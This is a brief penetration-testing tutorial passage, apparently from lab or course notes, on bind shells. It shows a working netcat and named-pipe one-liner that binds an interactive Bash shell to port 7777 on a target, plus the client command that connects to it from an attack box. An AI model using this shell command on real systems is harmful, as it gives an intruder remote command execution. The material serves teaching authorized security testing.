-----
With a bind shell, the `target` system has a listener started and awaits a connection from a pentester's system (attack box).

#### Server - Binding a Bash shell to the TCP session

```bash
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -lvnp 7777 > /tmp/f
```

#### Client - Connecting to bind shell on target

```bash
nc -nv 10.129.41.200 7777
```